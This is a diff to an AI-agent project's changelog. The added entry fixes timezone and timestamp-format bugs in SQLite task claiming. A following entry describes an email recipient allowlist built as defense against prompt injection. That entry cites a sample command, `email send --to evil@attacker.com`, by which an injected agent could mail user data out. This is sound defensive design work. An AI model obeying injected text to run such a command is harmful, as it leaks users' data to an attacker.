@@ -2,6 +2,23 @@
 
 > Istota was forked from a private project (Zorg) in February 2026. Entries before the fork reference the original name.
 
+## 2026-04-26: Fix timezone + format mismatch in task timestamps
+
+Four `TestClaimTaskChannelGate` tests were failing on a US-Pacific dev machine but passing on the UTC production server. Investigation traced it to `db.update_task_status()` writing `started_at` / `completed_at` / `updated_at` as `datetime.now().isoformat()` (Python local time, `T`-separator, microseconds) while `claim_task()` and friends compare those columns against SQLite's `datetime('now', '...')` (UTC, space-separator, no microseconds).
+
+Two distinct bugs braided into one symptom:
+
+1. **Timezone:** on negative-offset machines (PDT = UTC-7) the Python local-time `started_at` looks ~7 hours older than SQLite thinks "now" is. The "release recent stuck running tasks" cleanup in `claim_task` then fires immediately on a fresh task — flips it back to `pending`, increments `attempt_count`, and the per-channel-gate check no longer sees a locked/running sibling, so the wrong task gets claimed.
+
+2. **Format:** even on UTC, the `T` (0x54) vs space (0x20) separator at position 10 makes the Python-formatted timestamp sort *greater* than any `datetime('now', '-N minutes')` string. So `started_at < datetime('now', '-15 minutes')` was *never* true on UTC machines either — the 15-minute stuck-running detection has been silently dead on prod since it was written. Same goes for `cleanup_old_tasks` comparing `completed_at < datetime('now', '-N days')`.
+
+Fix is the cleaner of the two options: write timestamps via SQLite's `datetime('now')` directly inside the UPDATE instead of formatting in Python and binding as a parameter. Single source of truth, all UTC, all space-separated, all comparable. Applied to both `update_task_status()` (tasks table) and `update_istota_file_task_status()` (istota_file_tasks). The schema defaults already used `datetime('now')`, so this just makes the in-flight writes match the at-rest format.
+
+Verified: the four failing channel-gate tests now pass on PDT, and the full 3448-test suite is green. The dead 15-minute stuck-running detection is now actually live on UTC machines too — a latent bug that would have eventually bitten prod.
+
+**Files added/modified:**
+- `src/istota/db.py` — `update_task_status()` and `update_istota_file_task_status()` now write `started_at` / `completed_at` / `updated_at` via SQLite `datetime('now')` directly instead of `datetime.now().isoformat()` parameters.
+
 ## 2026-04-26: Layer A — recipient allowlist on outbound email
 
 First concrete adversarial-defense layer from the new spec at `Notes/Projects/Istota/Adversarial agent defense spec.md`. The skill proxy already keeps SMTP credentials out of the agent's env, but a prompt-injected agent can still call `istota-skill email send --to evil@attacker.com` because the proxy injects credentials into the skill subprocess regardless of recipient. Closes the most realistic exfiltration channel: convincing the agent to mail user data to an attacker.
